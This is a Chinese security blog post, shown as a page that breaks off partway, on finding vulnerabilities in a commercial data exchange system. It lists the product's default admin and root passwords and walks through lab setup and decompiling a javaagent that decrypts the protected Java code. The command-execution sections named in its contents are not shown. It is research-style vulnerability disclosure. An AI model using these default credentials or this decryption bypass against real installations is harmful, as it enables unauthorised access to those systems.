<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>某安全数据交换系统的漏洞挖掘 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container-wide wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=article-nav id=article-nav-id><div class=post><div class=post-header><div class=meta><div class=date><span class=day>18</span>
<span class=rest>Sep 2023</span></div></div><div class=matter><h1 class=title>某安全数据交换系统的漏洞挖掘</h1></div></div><aside class="show-on-mobile toc" id=static-toc><header><h3>Contents</h3></header><nav id=TableOfContents><ol><li><ol><li><a href=#配置网络>配置网络</a></li><li><a href=#源代码解密>源代码解密</a></li><li><a href=#远程调试tomcat>远程调试Tomcat</a></li><li><a href=#后台命令执行一>后台命令执行一</a></li><li><a href=#后台命令执行二>后台命令执行二</a></li><li><a href=#思考>思考</a></li></ol></li></ol></nav></aside><blockquote><p>本文写于2022年，分享一下挖掘某安全数据交换系统漏洞的过程。</p></blockquote><p>基本信息：</p><ul><li>后台管理界面用户名密码：admin/nxg@LL99</li><li>操作系统：root / bo%Fn!71、uninxg / lx$zR9ce</li></ul><h3 id=配置网络>配置网络</h3><p>根据产品安装文档环境搭建完毕后，手动设置IP地址和DNS：</p><p>手工修改 <code>/etc/resolv.conf</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>nameserver 114.114.114.114
</span></span><span style=display:flex><span>nameserver 8.8.8.8
</span></span></code></pre></td></tr></table></div></div><p>修改 <code>/etc/NetworkManager/NetworkManager.conf</code> 文件，在main部分添加 “dns=none” 选项：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>[main]
</span></span><span style=display:flex><span><span style=color:#75715e>#plugins=ifcfg-rh
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>dns<span style=color:#f92672>=</span>none
</span></span></code></pre></td></tr></table></div></div><p>网络IP地址配置文件在 <code>/etc/sysconfig/network-scripts</code> 文件夹下：</p><p><img src=https://images.payloads.online/2024-07-29-c1fdebce3a78e6a40d687eb5fa49a1b528c20752858153814edc88cba437ceaa.png alt=0></p><p>我添加了两个网卡，其中一个用来供本机访问：</p><p><img src=https://images.payloads.online/2024-07-29-683e57752f22f8419b233e4952db222874f86e8902cfdd70410619b4b6a2aea1.png alt=1></p><p><code>/etc/sysconfig/network-scripts/ifcfg-eth1-1</code></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>HWADDR<span style=color:#f92672>=</span><span style=color:#ae81ff>00</span><span style=color:#f92672>:</span><span style=color:#ae81ff>0</span>C:<span style=color:#ae81ff>29</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span>B:<span style=color:#ae81ff>16</span><span style=color:#f92672>:</span>B4
</span></span><span style=display:flex><span>TYPE<span style=color:#f92672>=</span>Ethernet
</span></span><span style=display:flex><span>PROXY_METHOD<span style=color:#f92672>=</span>none
</span></span><span style=display:flex><span>BROWSER_ONLY<span style=color:#f92672>=</span>no
</span></span><span style=display:flex><span>BOOTPROTO<span style=color:#f92672>=</span>none
</span></span><span style=display:flex><span>IPADDR<span style=color:#f92672>=</span><span style=color:#ae81ff>192.168.117.100</span>
</span></span><span style=display:flex><span>GATEWAY<span style=color:#f92672>=</span><span style=color:#ae81ff>192.168.117.2</span>
</span></span><span style=display:flex><span>PREFIX<span style=color:#f92672>=</span><span style=color:#ae81ff>24</span>
</span></span><span style=display:flex><span>DNS1<span style=color:#f92672>=</span><span style=color:#ae81ff>114.114.114.114</span>
</span></span><span style=display:flex><span>DNS2<span style=color:#f92672>=</span><span style=color:#ae81ff>8.8.8.8</span>
</span></span><span style=display:flex><span>DEFROUTE<span style=color:#f92672>=</span>yes
</span></span><span style=display:flex><span>IPV4_FAILURE_FATAL<span style=color:#f92672>=</span>no
</span></span><span style=display:flex><span>IPV4_DNS_PRIORITY<span style=color:#f92672>=</span><span style=color:#ae81ff>100</span>
</span></span><span style=display:flex><span>IPV6INIT<span style=color:#f92672>=</span>no
</span></span><span style=display:flex><span>NAME<span style=color:#f92672>=</span>eth1
</span></span><span style=display:flex><span>UUID<span style=color:#f92672>=</span><span style=color:#ae81ff>8</span>a47e710<span style=color:#f92672>-</span>cadd<span style=color:#f92672>-</span><span style=color:#ae81ff>49</span>b5<span style=color:#f92672>-</span>b9b7<span style=color:#f92672>-</span><span style=color:#ae81ff>33</span>a324c4ab66
</span></span><span style=display:flex><span>DEVICE<span style=color:#f92672>=</span>eth1
</span></span><span style=display:flex><span>ONBOOT<span style=color:#f92672>=</span>no
</span></span></code></pre></td></tr></table></div></div><p>观察启动命令行：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>jdk<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>java <span style=color:#f92672>-</span>Dnop <span style=color:#f92672>-</span>Djava.util.logging.manager<span style=color:#f92672>=</span>org.apache.juli.ClassLoaderLogManager <span style=color:#f92672>-</span>Dlog4j2.formatMsgNoLookups<span style=color:#f92672>=</span>true <span style=color:#f92672>-</span>javaagent:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>jdc.jar <span style=color:#f92672>-</span>Djdk.tls.ephemeralDHKeySize<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span> <span style=color:#f92672>-</span>Djava.protocol.handler.pkgs<span style=color:#f92672>=</span>org.apache.catalina.webresources <span style=color:#f92672>-</span>Dorg.apache.catalina.security.SecurityListener.UMASK<span style=color:#f92672>=</span><span style=color:#ae81ff>0022</span> <span style=color:#f92672>-</span>Dignore.endorsed.dirs<span style=color:#f92672>=</span> <span style=color:#f92672>-</span>classpath <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bootstrap.jar:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>tomcat<span style=color:#f92672>-</span>juli.jar <span style=color:#f92672>-</span>Dcatalina.base<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache <span style=color:#f92672>-</span>Dcatalina.home<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache <span style=color:#f92672>-</span>Djava.io.tmpdir<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>temp org.apache.catalina.startup.Bootstrap start
</span></span></code></pre></td></tr></table></div></div><p><code>/home/leagsoft/SafeDataExchange/Apache</code> 是Tomcat的安装目录，webapps目录下是部署的应用源代码：</p><p><img src=https://images.payloads.online/2024-07-29-7eb327a2b65b78ef6312f8ec7ee9a588095d75c22e7b6c0b376fe5954b4cb50d.png alt=2></p><p>将war包通过ssh拷贝至本地就可以看到整个项目的源代码了。</p><p><img src=https://images.payloads.online/2024-07-29-1a82b57f36a183a00f4b4ab358743ad1468f7c054a4d846d043739e40cb36011.png alt=3></p><h3 id=源代码解密>源代码解密</h3><p>将war包拷贝到本地通过idea打开，发现关键代码的实现都是空，连spring的控制器都是空，初步怀疑是被加密了，那么它是如何加密的呢？</p><p><img src=https://images.payloads.online/2024-07-29-3d65e98c169d8ee3d33e646b32ff390b9d60142de117b783b26ff2f4286059cf.png alt=4></p><p>既然网站可以正常跑起来，那么应该是运行时的某种技术手段实现，观察启动命令行：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>jdk<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>java 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dnop <span style=color:#f92672>-</span>Djava.util.logging.manager<span style=color:#f92672>=</span>org.apache.juli.ClassLoaderLogManager 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dlog4j2.formatMsgNoLookups<span style=color:#f92672>=</span>true 
</span></span><span style=display:flex><span><span style=color:#f92672>**-</span>javaagent:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>jdc.jar<span style=color:#f92672>**</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Djdk.tls.ephemeralDHKeySize<span style=color:#f92672>=</span><span style=color:#ae81ff>2048</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Djava.protocol.handler.pkgs<span style=color:#f92672>=</span>org.apache.catalina.webresources 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dorg.apache.catalina.security.SecurityListener.UMASK<span style=color:#f92672>=</span><span style=color:#ae81ff>0022</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dignore.endorsed.dirs<span style=color:#f92672>=</span> 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>classpath <span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>bootstrap.jar:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>bin<span style=color:#f92672>/</span>tomcat<span style=color:#f92672>-</span>juli.jar 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Dcatalina.base<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache <span style=color:#f92672>-</span>Dcatalina.home<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache 
</span></span><span style=display:flex><span><span style=color:#f92672>-</span>Djava.io.tmpdir<span style=color:#f92672>=/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>temp org.apache.catalina.startup.Bootstrap start
</span></span></code></pre></td></tr></table></div></div><p>命令行中有一个javaagent引起了我的注意：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#f92672>-</span>javaagent:<span style=color:#f92672>/</span>home<span style=color:#f92672>/</span>leagsoft<span style=color:#f92672>/</span>SafeDataExchange<span style=color:#f92672>/</span>Apache<span style=color:#f92672>/</span>lib<span style=color:#f92672>/</span>jdc.jar 
</span></span></code></pre></td></tr></table></div></div><p>将lib文件夹拷贝到项目中，观察jar包的结构：</p><p><img src=https://images.payloads.online/2024-07-29-3a3d748071951a49d48afca2648beb92e8e0f801908aaa4681985e013407260e.png alt=5></p><p>看样子是调用了javassist实现了一种内存补丁技术，找到Agent的入口方法，看看它做了什么：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>//</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Source code recreated from a .class file by IntelliJ IDEA</span>
</span></span><span style=display:flex><span><span style=color:#75715e>// (powered by Fernflower decompiler)</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>package</span> com.leagsoft.declass;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.instrument.Instrumentation;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Agent</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>Agent</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>premain</span>(String args, Instrumentation inst) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        CoreAgent.<span style=color:#a6e22e>premain</span>(args, inst);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>跟进<code>CoreAgent.premain</code>：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>CoreAgent</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#a6e22e>CoreAgent</span>() {
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>premain</span>(String args, Instrumentation inst) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (inst <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {
</span></span><span style=display:flex><span>            File file <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> File(<span style=color:#e6db74>&#34;../../Ini/ec.file&#34;</span>);
</span></span><span style=display:flex><span>            Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> configMap <span style=color:#f92672>=</span> ECFileConfig.<span style=color:#a6e22e>getConfig</span>();
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> IoUtils.<span style=color:#a6e22e>readFileToByte</span>(file);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> by <span style=color:#f92672>=</span> EncryptUtils.<span style=color:#a6e22e>de</span>(bytes, ((String)configMap.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;pf&#34;</span>)).<span style=color:#a6e22e>toCharArray</span>(), 1);
</span></span><span style=display:flex><span>            AgentTransformer tran <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AgentTransformer(EncryptUtils.<span style=color:#a6e22e>rsk</span>(<span style=color:#66d9ef>new</span> String(by)).<span style=color:#a6e22e>toCharArray</span>());
</span></span><span style=display:flex><span>            inst.<span style=color:#a6e22e>addTransformer</span>(tran);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></td></tr></table></div></div><p>这里可以看到，它是先通过ECFileConfig初始化，然后解密读取Ini/ec.file</p><p>跟进<code>ECFileConfig.getConfig()</code>：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
